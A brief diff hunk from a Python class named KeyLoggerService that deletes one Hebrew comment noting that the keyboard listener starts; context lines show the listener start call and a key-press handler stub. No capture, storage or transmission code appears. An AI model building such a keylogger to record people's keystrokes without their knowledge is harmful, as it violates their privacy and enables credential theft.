@@ -8,7 +8,6 @@ class KeyLoggerService():
         self.runnuig = False
 
     def startLoggers(self):
-        # הפעלת המאזין למקלדת
         self.lestener.start()
 
     def __on_press(self, key):
